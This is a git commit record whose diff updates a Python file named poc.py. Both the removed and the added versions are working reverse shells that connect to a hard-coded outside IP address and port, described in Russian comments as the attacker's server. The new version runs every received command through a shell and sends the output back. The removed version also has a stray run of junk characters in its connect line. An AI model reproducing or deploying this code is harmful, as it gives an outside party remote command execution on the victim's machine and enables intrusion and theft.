814bb0817ee189cd63f17a060c28db9e96d21eed
marcusovkost <nemarcusov@gmail.com>
2025-01-25 18:34:50 +0300

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,18 +1,19 @@
 import socket
 import subprocess
-import os
 
-# Укажите ваш IP-адрес и порт, на которые сервер будет подключаться
-IP = "95.165.8.178"  # Замените на ваш IP-адрес
-PORT = 7777       # Замените на порт, который вы прослушиваете
+server_ip = '95.165.8.178'  # Ваш IP-адрес (это будет IP вашего атакующего сервера)
+server_port = 7777         # Порт, на котором будет слушать ваш сервер
 
-def reverse_shell(ip, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))   ojkjlljklkljk
-    os.dup2(s.fileno(), 0)  # Перенаправление stdin
-    os.dup2(s.fileno(), 1)  # Перенаправление stdout
-    os.dup2(s.fileno(), 2)  # Перенаправление stderr
-    p = subprocess.call(["/bin/sh", "-i"])
+# Создаем сокет для подключения к вашему серверу
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((server_ip, server_port))
 
-# Запуск функции
-reverse_shell(IP, PORT)
+while True:
+    command = s.recv(1024).decode('utf-8')  # Получаем команду от атакующего сервера
+    if command.lower() == 'exit':
+        break
+    if command:
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        s.send(output.stdout + output.stderr)  # Отправляем результат выполнения команды обратно
+
+s.close()
